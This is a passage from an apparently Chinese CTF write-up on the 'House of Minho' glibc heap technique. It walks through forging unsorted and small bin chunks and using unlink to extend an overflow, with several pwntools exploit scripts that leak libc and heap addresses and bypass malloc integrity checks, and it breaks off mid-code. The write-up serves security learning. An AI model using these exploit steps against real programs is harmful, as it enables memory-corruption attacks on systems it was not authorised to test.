<span class=\"comment\">// !!!!!! 注意这里 放入了tcache内</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>目标明确，那么命中small bin需要先绕过Tcache，也就是当前<code>Tcache[0x90]</code>不能有free的堆块，以及需要一次<code>malloc(0x80)</code>，那么我们伪造的small bin大小也需要是0x90</p>\n<h2 id=\"伪造Small-bin（0x90）可行性讨论\"><a href=\"#伪造Small-bin（0x90）可行性讨论\" class=\"headerlink\" title=\"伪造Small bin（0x90）可行性讨论\"></a>伪造Small bin（0x90）可行性讨论</h2><p>如何伪造一个0x90大小的Small bin呢？进入Small bin可以从Unsorted bin进入，如何进入呢？</p>\n<ol>\n<li>当前Unsorted bin中有一个0x90大小的堆块空闲</li>\n<li>malloc一次大于0x90大小的堆块<code>size &gt;= 0x90 &amp;&amp; malloc(size)</code>，且不能命中Tcache</li>\n</ol>\n<p>条件2比较简单满足，依旧是scanf利用</p>\n<p>对于我们现在的堆块布局来说，我们仅仅只能控制0x90堆块size位（看上文的泄露后堆布局情况图片），这个位置能做什么文章呢？那么答案十分明朗：<strong>伪造Unsorted bin！</strong></p>\n<p>我们先讨论一下，是否可行，我们能溢出可控空间为<code>0x80-0x40=0x40</code>，这个0x40大小的空间包括了下一个堆块的<code>prev_size</code>和<code>size</code>位置，以及堆块内容部分。假设我们能修改上图中0x90堆块的size位置改大，并能成功free，那么就会进入unsorted bin中，<strong>如果此时构造我们无法完成两块小哨兵块的布置</strong>，因为需要如下的布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">     | prev_size |  size  |</span><br><span class=\"line\">     +--------------------+</span><br><span class=\"line\">0x00 |           |  0x50  |    </span><br><span class=\"line\">0x10 |           |        |    -- 可控起始位置</span><br><span class=\"line\">     +--------------------+   &lt;- Unsorted bin</span><br><span class=\"line\">0x50 |           |  0x91  |</span><br><span class=\"line\">0x90 |           |        |    </span><br><span class=\"line\">0xD0 |           |        |    -- 可控终止位置</span><br><span class=\"line\">     +--------------------+</span><br><span class=\"line\">0xE0 |           |  0x10  |    -- Chunk A</span><br><span class=\"line\">     +--------------------+</span><br><span class=\"line\">0xF0 |           |  0x11  |    -- Chunk B</span><br><span class=\"line\">     +--------------------+</span><br></pre></td></tr></table></figure>\n\n<p>（可控地址指的是，我们可以通过malloc(0x40)向后写0x80字节，以及malloc(0x80)也能写0x80字节，上面例子也就是总长度可控为<code>0x80*2-0x40=0xC0</code>）</p>\n<p>但是可控空间完全不够布置下面的Chunk AB，要怎么办呢？我们需要可控多长呢？</p>\n<p>在绞尽脑汁几个小时之后，我注意到了我们貌似浪费了0x50堆块中的0x40长度的大小。怎么办呢？</p>\n<h2 id=\"Unlink扩展溢出距离\"><a href=\"#Unlink扩展溢出距离\" class=\"headerlink\" title=\"Unlink扩展溢出距离\"></a>Unlink扩展溢出距离</h2><p>这里我们可以利用Unlink手法，使得Unsorted bin向前合并，首先我们构造如下的布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">     | prev_size |  size      |</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0x00 |           |  0x50      |    </span><br><span class=\"line\">0x10 | fd        |  bk        |    -- 可控起始位置</span><br><span class=\"line\">0x20 |           |  0x31      |</span><br><span class=\"line\">0x30 | fake fd   |  fake bk   |</span><br><span class=\"line\">     +------------------------+    </span><br><span class=\"line\">0x50 | 0x30      |  0x?0      |    -- 这里的prev_inuse设置为0</span><br><span class=\"line\">0x90 |           |            |    </span><br><span class=\"line\">0xD0 |           |            |    -- 可控终止位置</span><br><span class=\"line\">     +------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>使得在free掉下方堆块的时候可以向后合并，这样子就可以完成溢出可控距离的扩展</p>\n<p>那么这个时候再来讨论一下可控长度，我们此时修改Unsorted bin内的布局，此时我们发现可控距离完全足够进行布局了！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">     | prev_size |  size      |</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0x00 |           |  0x50      |    </span><br><span class=\"line\">0x10 | fd        |  bk        |    -- 可控起始位置</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0x20 |           |  0x91      |    &lt;- Unsorted bin  </span><br><span class=\"line\">0x90 |           |            |</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0xB0 |           |  0x10      |    -- Chunk A</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0xC0 |           |  0x11      |    -- Chunk B</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0xD0 |           |            |    -- 可控终止位置</span><br></pre></td></tr></table></figure>\n\n<p>（仔细观察上面三个布局演示，可控起始和终止的偏移从未变化，仅仅通过Unlink之后利用率提高了）</p>\n<p>如何实现Unlink？</p>\n<p>只需要满足下面的条件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;fd = p;</span><br><span class=\"line\">p-&gt;bk = p;</span><br><span class=\"line\">next(p)-&gt;prev_inuse = <span class=\"number\">0</span>;</span><br><span class=\"line\">next(p)-&gt;prev_size = p-&gt;size;</span><br></pre></td></tr></table></figure>\n\n<p>绕过源码中，下面这个检查</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mchunkptr fd = p-&gt;fd;</span><br><span class=\"line\">mchunkptr bk = p-&gt;bk;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class=\"number\">0</span>))</span><br><span class=\"line\">  malloc_printerr (<span class=\"string\">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>但是但是，现在还有一个问题，实现unlink攻击，需要free掉一个大的堆块进入Unsorted bin内，也就是说，我们需要修改原来0x90堆块的size改大，并需要满足free的Unsorted bin检查，也就是，尽量不要进入向前合并流程（因为我们本来可控的空间就只有上面的<code>[0x10,0xD0]</code>），那么需要如何做呢？请读者再压下脑栈，马上就要串起来了，继续往下看！</p>\n<h2 id=\"伪造Unsorted-bin\"><a href=\"#伪造Unsorted-bin\" class=\"headerlink\" title=\"伪造Unsorted bin\"></a>伪造Unsorted bin</h2><p>我们再次回顾一下当前的堆布局，可以看到当前unsorted bin下方有一个0x10和0x11的堆块，那么我们假设，如果有某种方法，使得0x90这个堆块覆盖成以下的红色框框圈起来呢？并且是否有方法让下方0x11堆块之后的prev_inuse变成1呢？（为何要为1，因为要防止合并）</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118013645858.png\" alt=\"image-20231118013645858\"></p>\n<p>什么时候能修改最下方堆块的内容呢？答案是还是<code>scanf</code>！</p>\n<p>scanf的缓冲区会申请再堆内，那我如果缓冲区足够大是否能够刚好往0x11堆块的后面size内写入一些数据呢？写入多少呢？</p>\n<p><code>0x33</code>！！！因为这个ascii字符是<code>3</code>，也就是选择free的菜单选项，什么时候写入呢？当然是最最最开始的时候，堆十分“干净”的时候啦</p>\n<p>那么经过测试，再所有操作之前输入0xd58个字符0以及一个字符3即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free3</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free3(<span class=\"number\">0xd59</span>) <span class=\"comment\"># 这里就是污染0x11堆块之后的堆块的size位置</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>))</span><br></pre></td></tr></table></figure>\n\n<p>让我们再看看堆块长什么样子了</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118014409013.png\" alt=\"image-20231118014409013\"></p>\n<p>WoW！！成功污染！那么我们就能成功伪造Unsorted bin了，稍微微调以下代码可以得到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>) </span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里微调了0x90堆块的size位置，不再是修复而是伪造</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xd01</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>此时我们可以看到unsorted bin内如愿以偿的放入了我们的Fake Chunk！</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118014647807.png\" alt=\"image-20231118014647807\"></p>\n<h2 id=\"Unlink攻击以及Smallbin伪造攻击实施\"><a href=\"#Unlink攻击以及Smallbin伪造攻击实施\" class=\"headerlink\" title=\"Unlink攻击以及Smallbin伪造攻击实施\"></a>Unlink攻击以及Smallbin伪造攻击实施</h2><p>感谢你耐心看到这里，相信你现在脑栈已经快爆了，终于我们迎来了弹出脑栈的步骤了</p>\n<p>将上文的Unlink攻击实施，微调Exp可以得到如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里修改了unlink攻击的内容</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>此时堆块就不那么好看了。</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118015159589.png\" alt=\"image-20231118015159589\"></p>\n<p>如此查看我们可以发现unlink成功实施了，Unsorted bin内第一个堆块从0xd00变成了0xd30</p>\n<p>那么继续我们将伪造Small bin的攻击实施，再次微调Exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这次微调了这里，加入了上文提到的Chunk AB的布置</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0x00</span>) + p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里就开始修改Unsorted bin内容，使得在Unsorted bin内伪造一个Small bin大小的堆块</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: heap_base + <span class=\"number\">0x380</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc_base + <span class=\"number\">0x219ce0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>) <span class=\"comment\"># 这里触发使得Unsorted bin进入Samll bin</span></span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>让我们再次检验堆块的结构！完美成功进入了Small bin！！！</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118015627633.png\" alt=\"image-20231118015627633\"></p>\n<p>那么接下来我们就要开始在Small bin里面伪造一条多个0x90的链条，使得再次malloc(0x80)命中small bin的时候，放入Tcache bin中</p>\n<h2 id=\"修改Small-bin\"><a href=\"#修改Small-bin\" class=\"headerlink\" title=\"修改Small bin\"></a>修改Small bin</h2><p>首先我们需要知道我们能改动多长？0x80长度，然而除去tcache bin的fd和bk位置，仅剩下0x70长度可以可控，也就是说，我们需要在0x70的长度中尽可能多的伪造0x90堆块，并串起来</p>\n<p>我们仅仅只能伪造3个0x90的堆块，如何伪造？</p>\n<p>可以参考如下图的伪造方法，可以看到这里bk连线串成了一条链</p>\n<p><img src=\"/p/houseofminho-wp/houseofminho_smallbin.png\" alt=\"houseofminho_smallbin\"></p>\n<p>注意红色Chunk位置的fd设置，需要绕过small bin中的检查（下面源码），而黄色的绿色的fd是否需要设置，留给读者们讨论</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">  malloc_printerr (<span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>那么稍微微调一下exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span 